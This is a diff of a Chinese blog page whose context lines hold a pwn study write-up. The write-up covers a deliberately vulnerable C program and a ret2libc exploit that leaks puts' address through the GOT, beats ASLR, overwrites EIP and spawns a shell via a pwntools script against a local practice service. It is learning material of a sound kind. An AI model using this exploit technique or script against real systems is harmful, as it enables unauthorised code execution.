@@ -86,24 +86,24 @@
 <meta property="og:site_name" content="Aeolus&#39;s blog">
 <meta property="og:description" content="自己学习pwn的一点点checksec查看开的保护开了NX，表示在堆栈上不可执行shellcode，本地系统是开启了ASLR随机化的，说明每次程序启动后stack、heap、library的位置是随机的 源代码：12345678910111213141516171819202122232425262728293031323334#include &amp;lt;stdio.h&amp;gt;void See_so">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/pwn-study-1/1.jpg">
-<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/pwn-study-1/2.png">
-<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/pwn-study-1/3.jpg">
-<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/pwn-study-1/4.png">
-<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/pwn-study-1/5.png">
-<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/pwn-study-1/6.png">
-<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/pwn-study-1/111.png">
-<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/pwn-study-1/7.jpg">
-<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/pwn-study-1/8.png">
-<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/pwn-study-1/9.png">
-<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/pwn-study-1/10.png">
-<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/pwn-study-1/11.png">
-<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/pwn-study-1/12.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/1.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/3.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/111.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/7.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/8.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/9.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/10.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/11.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/19/pwn-study-1/12.png">
 <meta property="og:updated_time" content="2018-09-19T14:35:51.834Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwn_study_1">
 <meta name="twitter:description" content="自己学习pwn的一点点checksec查看开的保护开了NX，表示在堆栈上不可执行shellcode，本地系统是开启了ASLR随机化的，说明每次程序启动后stack、heap、library的位置是随机的 源代码：12345678910111213141516171819202122232425262728293031323334#include &amp;lt;stdio.h&amp;gt;void See_so">
-<meta name="twitter:image" content="http://yoursite.com/2018/09/19/pwn-study-1/pwn-study-1/1.jpg">
+<meta name="twitter:image" content="http://yoursite.com/2018/09/19/pwn-study-1/1.jpg">
 
 
 
@@ -343,17 +343,17 @@
       
 
       
-        <p>自己学习pwn的一点点<br>checksec查看开的保护<br><img src="pwn-study-1/1.jpg" alt=""><br><img src="pwn-study-1/2.png" alt=""><br>开了NX，表示在堆栈上不可执行shellcode，本地系统是开启了ASLR随机化的，说明每次程序启动后stack、heap、library的位置是随机的</p>
+        <p>自己学习pwn的一点点<br>checksec查看开的保护<br><img src="/2018/09/19/pwn-study-1/1.jpg" alt=""><br><img src="/2018/09/19/pwn-study-1/2.png" alt=""><br>开了NX，表示在堆栈上不可执行shellcode，本地系统是开启了ASLR随机化的，说明每次程序启动后stack、heap、library的位置是随机的</p>
 <p>源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void See_something(unsigned int addr)&#123;</span><br><span class="line">	int *address ;</span><br><span class="line">	address = (int *)addr ;</span><br><span class="line">	printf(&quot;The content of the address : %p\n&quot;,*address);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void Print_message(char *mesg)&#123;</span><br><span class="line">	char buf[48];</span><br><span class="line">	strcpy(buf,mesg);</span><br><span class="line">	printf(&quot;Your message is : %s&quot;,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	char address[10] ;</span><br><span class="line">	char message[256];</span><br><span class="line">	unsigned int addr ;</span><br><span class="line">	puts(&quot;###############################&quot;);</span><br><span class="line">	puts(&quot;Do you know return to library ?&quot;);</span><br><span class="line">	puts(&quot;###############################&quot;);</span><br><span class="line">	puts(&quot;What do you want to see in memory?&quot;);</span><br><span class="line">	printf(&quot;Give me an address (in dec) :&quot;);</span><br><span class="line">	fflush(stdout);</span><br><span class="line">	read(0,address,10);</span><br><span class="line">	addr = strtol(address);</span><br><span class="line">	See_something(addr) ;</span><br><span class="line">	printf(&quot;Leave some message for me :&quot;);</span><br><span class="line">	fflush(stdout);</span><br><span class="line">	read(0,message,256);</span><br><span class="line">	Print_message(message);</span><br><span class="line">	puts(&quot;Thanks you ~&quot;);</span><br><span class="line">	return 0 ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>  读源代码后可以看到程序功能是输入一个地址，程序会返回在内存中的实际地址回来，然后再输入一个字符串，程序使用strcpy函数拷贝这个字符串，在这里就发生了栈溢出。但是堆栈是不可执行的，所以我们不能直接把shellcode直接布置到栈上。这时就要用到return to library，就是说用程序中的libc自带的system函数地址去覆盖eip的值，就可以执行system函数了。现在还有一个问题是由于开启了ASLR，每次程序加载library是随机的地址，我们不能确定system的地址，但是程序的See_something函数会泄露这个地址，具体方法后面说到，总的来说就是利用See_something函数来泄露地址，利用Print_message函数来栈溢出</p>
-<p>先用ncat命令把程序跑起来<br><img src="pwn-study-1/3.jpg" alt=""></p>
-<p>用obgdump -R命令查找程序里动态链接调用的函数相对偏移地址（got表地址）<br><img src="pwn-study-1/4.png" alt=""><br>我们选取puts函数待会用来计算system实际的位置，puts相对偏移的地址记作puts_got=0x0804a01c，用python转化成10进制，再输入到程序中获得此时puts的实际位置<br><img src="pwn-study-1/5.png" alt=""><br><img src="pwn-study-1/6.png" alt=""><br>验证一下看到确实是puts的实际位置<br><img src="pwn-study-1/111.png" alt=""></p>
-<p>然后pwntools库中的cyclic函数生成一串字符来定位覆盖EIP的位置<br><img src="pwn-study-1/7.jpg" alt=""><br>把生成的字符输入到程序中，看到是paaa覆盖了EIP<br><img src="pwn-study-1/8.png" alt=""><br>所以判断是第61个字节覆盖了EIP<br><img src="pwn-study-1/9.png" alt=""></p>
-<p>然后分别查找puts函数和system函数相对libc的offset<br><img src="pwn-study-1/10.png" alt=""><br>就可以计算出system_addr = puts_addr-puts_off+system_off</p>
-<p>再寻找“sh”字符串在内存中的地址，待会作为system的参数<br><img src="pwn-study-1/11.png" alt=""><br>这些地址中选一个就可以</p>
+<p>先用ncat命令把程序跑起来<br><img src="/2018/09/19/pwn-study-1/3.jpg" alt=""></p>
+<p>用obgdump -R命令查找程序里动态链接调用的函数相对偏移地址（got表地址）<br><img src="/2018/09/19/pwn-study-1/4.png" alt=""><br>我们选取puts函数待会用来计算system实际的位置，puts相对偏移的地址记作puts_got=0x0804a01c，用python转化成10进制，再输入到程序中获得此时puts的实际位置<br><img src="/2018/09/19/pwn-study-1/5.png" alt=""><br><img src="/2018/09/19/pwn-study-1/6.png" alt=""><br>验证一下看到确实是puts的实际位置<br><img src="/2018/09/19/pwn-study-1/111.png" alt=""></p>
+<p>然后pwntools库中的cyclic函数生成一串字符来定位覆盖EIP的位置<br><img src="/2018/09/19/pwn-study-1/7.jpg" alt=""><br>把生成的字符输入到程序中，看到是paaa覆盖了EIP<br><img src="/2018/09/19/pwn-study-1/8.png" alt=""><br>所以判断是第61个字节覆盖了EIP<br><img src="/2018/09/19/pwn-study-1/9.png" alt=""></p>
+<p>然后分别查找puts函数和system函数相对libc的offset<br><img src="/2018/09/19/pwn-study-1/10.png" alt=""><br>就可以计算出system_addr = puts_addr-puts_off+system_off</p>
+<p>再寻找“sh”字符串在内存中的地址，待会作为system的参数<br><img src="/2018/09/19/pwn-study-1/11.png" alt=""><br>这些地址中选一个就可以</p>
 <p>后面在覆盖EIP的时候有一个点要注意，在获得system位置，复写return address跳到system上，参数（“sh”）也要一起放上，此时要注意多空一个，因为我们是利用ret而不是call，一般call之后会push一个return address进去stack中，function取参数会空一格再取</p>
 <p>然后就可以开始写exp了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">host = &quot;127.0.0.1&quot;</span><br><span class="line">port = 8888</span><br><span class="line"></span><br><span class="line">r = remote(host,port)</span><br><span class="line">//puts函数got表中的位置，输入到程序中获得真实的位置</span><br><span class="line">puts_got=0x0804a01c</span><br><span class="line">//一直获取到分号</span><br><span class="line">r.recvuntil(&quot;:&quot;)</span><br><span class="line">//把puts_got发送给程序</span><br><span class="line">r.sendline(str(puts_got))</span><br><span class="line">r.recvuntil(&quot;: &quot;)</span><br><span class="line">//获取到程序返回的puts的真实地址</span><br><span class="line">puts_addr = int(r.recvuntil(&apos;\n&apos;).strip(),16)</span><br><span class="line">//puts和system函数相对libc的偏移地址</span><br><span class="line">puts_off = 0x5fca0</span><br><span class="line">system_off = 0x3ada0</span><br><span class="line">//计算system的真实地址</span><br><span class="line">system_addr = puts_addr-puts_off+system_off</span><br><span class="line">//获取到sh字符串在内存中的地址</span><br><span class="line">sh = 0x804829e</span><br><span class="line">//构造payload，前60个a是用来溢出的，第61位用system覆盖了EIP，后面空一个栈单位（4字节），后面再传入参数</span><br><span class="line">payload = 60*&quot;a&quot; + p32(system_addr) + p32(0xdeadbeef) + p32(sh)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&quot;:&quot;)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">//直接进行交互，相当于回到shell的模式</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
-<p>溢出利用<br><img src="pwn-study-1/12.png" alt=""></p>
+<p>溢出利用<br><img src="/2018/09/19/pwn-study-1/12.png" alt=""></p>
 
       
     </div>
